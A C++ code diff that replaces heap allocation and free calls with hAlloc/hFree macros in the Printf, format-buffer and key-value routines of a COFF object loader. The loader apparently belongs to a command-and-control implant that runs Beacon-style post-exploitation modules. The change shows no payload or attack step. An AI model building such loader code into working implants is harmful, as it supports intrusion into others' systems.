@@ -55,7 +55,7 @@ auto DECLFN Coff::Printf(
         KhDbg( "failed get the formated message size" ); goto _KH_END;
     }
 
-    MsgBuff = (CHAR*)Self->Hp->Alloc( MsgSize +1 );
+    MsgBuff = (CHAR*)hAlloc( MsgSize +1 );
 
     if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, fmt, VaList ) < 0 ) {
         KhDbg( "failed formating string" ); goto _KH_END;
@@ -69,7 +69,7 @@ auto DECLFN Coff::Printf(
 
 _KH_END:
     if ( VaList  ) va_end( VaList );
-    if ( MsgBuff ) Self->Hp->Free( MsgBuff );
+    if ( MsgBuff ) hFree( MsgBuff );
 }
 
 auto DECLFN Coff::DataExtract(
@@ -108,7 +108,7 @@ auto DECLFN Coff::FmtAlloc(
 
     if ( !Fmt ) return;
 
-    Fmt->original = (CHAR*)Self->Hp->Alloc( Maxsz );
+    Fmt->original = (CHAR*)hAlloc( Maxsz );
     Fmt->buffer   = Fmt->original;
     Fmt->length   = 0;
     Fmt->size     = Maxsz;
@@ -188,7 +188,7 @@ auto DECLFN Coff::FmtFree(
     if ( !Fmt ) return;
 
     if ( Fmt->original ) {
-        Self->Hp->Free( Fmt->original );
+        hFree( Fmt->original );
         Fmt->original = nullptr;
     }
     
@@ -431,8 +431,8 @@ auto Coff::RmValue(
                 Prev->Next = Current->Next;
             }
 
-            Self->Hp->Free( Current->Key );
-            Self->Hp->Free( Current );
+            hFree( Current->Key );
+            hFree( Current );
             
             return TRUE;
         }
@@ -452,13 +452,13 @@ auto Coff::AddValue(
 
     if ( !key || Self->Cf->GetValue( key ) ) return FALSE;
 
-    VALUE_DICT* NewData = (VALUE_DICT*)Self->Hp->Alloc( sizeof( VALUE_DICT ) );
+    VALUE_DICT* NewData = (VALUE_DICT*)hAlloc( sizeof( VALUE_DICT ) );
     if ( ! NewData ) return FALSE;
     
     size_t keyLen = Str::LengthA( key );
-    NewData->Key  = (CHAR*)Self->Hp->Alloc( keyLen + 1 );
+    NewData->Key  = (CHAR*)hAlloc( keyLen + 1 );
     if ( ! NewData->Key) {
-        Self->Hp->Free(NewData);
+        hFree(NewData);
         return FALSE;
     }
 
